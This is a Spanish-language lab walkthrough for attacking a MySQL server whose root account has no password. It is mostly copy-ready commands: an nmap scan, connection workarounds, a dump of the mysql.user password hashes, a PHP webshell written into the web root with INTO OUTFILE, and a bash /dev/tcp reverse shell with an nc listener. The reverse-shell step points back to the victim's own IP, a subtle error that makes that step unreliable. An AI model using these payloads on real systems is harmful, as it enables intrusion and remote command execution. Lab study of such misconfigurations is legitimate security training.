# 💾 Servicio: MySQL – Puerto 3306.

## 🎯 1. Objetivo del laboratorio.

Aprovecharemos una mala configuración del servicio MySQL que nos permite:

- Acceder al servicio sin contraseña como el usuario root.
- Leer archivos sensibles del sistema (/etc/passwd, etc).
- Cargar una **reverse shell** escribiendo directamente en archivos del sistema (/var/www/html/shell.php).
- Ganar acceso remoto a la máquina víctima, incluso sin necesidad de vulnerabilidades activas.

Este laboratorio demuestra cómo una mala configuración por defecto (como permitir acceso root sin contraseña) puede ser igual de peligrosa que una vulnerabilidad explotable.

## 🔧 2. ¿Qué es MySQL?.

MySQL es un sistema de bases de datos muy utilizado en aplicaciones web. Escucha por defecto en el puerto 3306.
Cuando no está bien asegurado, nos permite:

- Iniciar sesión como root sin contraseña.
- Interactuar directamente con el sistema de archivos desde SQL (SELECT, INTO, OUTFILE...).
- Ejecutar comandos del sistema operativo (UDFs o plugins inseguros).

## 🛠️ 3. Explotación paso a paso.

### 🔍 Paso 1: Escaneo con Nmap

```bash
nmap -sV -p 3306 192.168.56.102
```

| Puerto   | Estado | Protocolo | Servicio | Versión                  |
|----------|--------|-----------|----------|---------------------------|
| 3306/tcp | open   | TCP       | MySQL    | MySQL 5.0.51a-3ubuntu5    |

### 🔐 Paso 2: Intentar acceso con MySQL sin contraseña

```bash
mysql -h 192.168.56.102 -u root
```

⚠️ Si nos encontramos con el siguiente error:

ERROR 2026 (HY000): TLS/SSL error: wrong version number

Significa que el cliente de MySQL está intentando usar TLS/SSL para conectarse al servidor, pero el servidor no lo soporta al ser ver una versión antigua.

✅ Cómo solucionarlo.

Existen dos formas:

#### 🔧 Opción 1: Desactivar SSL en el cliente (la más rápida).

Usa la opción --ssl-mode=DISABLED al conectarte:

```bash
mysql -h 192.168.56.102 -u root --ssl-mode=DISABLED
```
⚠️ Es totalmente normal desactivarlo si estás trabajando en entornos locales de laboratorio (y sobre todo con versiones antiguas como esta).

Si cuando realizamos este paso, nos encontramos con el siguiente error:

mysql: unknown variable 'ssl-mode=DISABLED'

Indica que la versión del cliente de mysql no reconoce la opción --ssl-mode, algo que ocurre cuando se usa un cliente mysql tradicional (MySQL 5.x o antiguo) o un wrapper como mariadb-client.

✅ Solución alternativa: Usa --skip-ssl

Nos podemos intentar conectarnos desactivando SSL con esta opción compatible con versiones más antiguas del cliente:

```bash
mysql -h 192.168.56.102 -u root --skip-ssl
```
Esto hace exactamente lo mismo (ignora la conexión TLS), pero con una opción reconocida por más versiones del cliente.

✅ Otra alternativa: Especificar protocolo TCP (forzar que no use socket)

Algunos sistemas modernos de Kali o Parrot usan **MariaDB** por defecto, que cambia algunas cosas. Podemos probar:

```bash
mysql -h 192.168.56.102 -u root --protocol=TCP
```

#### 🛠 Opción 2 (menos recomendable): Usar un cliente de versión antigua.

Se podría instalar una versión antigua del cliente de MySQL, como la 5.0 o 5.1 (más acorde al servidor), pero no es necesario para entornos de pruebas si puedes usar --ssl-mode=DISABLED.

### 🔎 Paso 3: Ver bases de datos y privilegios.

Una vez que conseguimos estar dentro del cliente interactivo de MySQL:

```sql
SHOW DATABASES;
SELECT user, host, password FROM mysql.user;
```

🔎 Esto nos muestra todos los usuarios de MySQL y si tienen contraseña (campo password vacío).

### 💾 Paso 4: Ver si podemos escribir archivos en el sistema

Intengamos crear una **webshell** si el servicio web está en la misma máquina.

```sql
USE mysql;
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
```
✅ Si esto funciona, ¡acabas de subir una backdoor vía MySQL!

### 🌐 Paso 5: Probar la shell PHP

Abrimos el navegador:

```bash
http://192.168.56.102/shell.php?cmd=whoami
```

### 🧨 Paso 6 (opcional): Obtener una reverse shell

En lugar del system($_GET['cmd']), podemos escribir directamente una reverse shell en PHP:

```sql
SELECT "<?php system('bash -c \"bash -i >& /dev/tcp/192.168.56.102/4444 0>&1\"'); ?>" 
INTO OUTFILE "/var/www/html/rev.php";
```

Ahora:

```bash
nc -lvnp 4444
```

Y luego visitamos en el navegador:

```arduino
http://192.168.56.102/rev.php
```

🎉

¡Tendrás una shell directa desde Apache a tu Kali!

## 🧠 4. Consideraciones de seguridad

- Permitir conexiones root sin contraseña es un fallo grave.
- Permitir que SELECT ... INTO OUTFILE funcione en directorios críticos puede llevar a ejecución remota de comandos.
- Las bases de datos deben escucharse solo en localhost, o protegerse con firewall.
